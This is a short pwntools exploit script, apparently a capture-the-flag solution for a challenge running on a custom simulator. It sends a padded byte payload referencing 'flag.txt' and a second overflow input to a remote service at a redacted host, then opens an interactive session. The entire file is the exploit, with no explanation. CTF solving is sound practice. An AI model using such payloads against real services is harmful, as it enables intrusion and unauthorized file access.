from pwn import *

payload = [82, 0, 54, 106, 0, 0, 109, 4, 137, 136, 0, 0, 163, 0, 0, 9, 0, 0, 108, 3, 0, 82, 0, 0, 133, 0, 0, 136, 5, 2, 159, 0, 27, 9, 0, 0, 82, 0, 27, 109, 0, 27, 133, 0, 0, 136, 5, 244, 159, 0, 27, 9, 0, 0, 82, 0, 108, 109, 0, 0, 9, 0, 0, 102, 108, 97, 103, 46, 116, 120, 116, 0, 0, 0, 0, 0, 0, 0]
payload = b'\0' * (5 * 729 - 3471) + bytes(payload)
payload2 = b'\0' * 102 + bytes([0, 5, 0])

#r = process('../../sim/simulator -g pwn 2>log.txt', shell=True)
#r = process('../../sim/simulator pwn', shell=True)
r = remote('xxx', 10035)
r.sendlineafter('Tell me your name: ', payload)
r.sendlineafter("What's your favorite fruit?", payload2)
r.interactive()
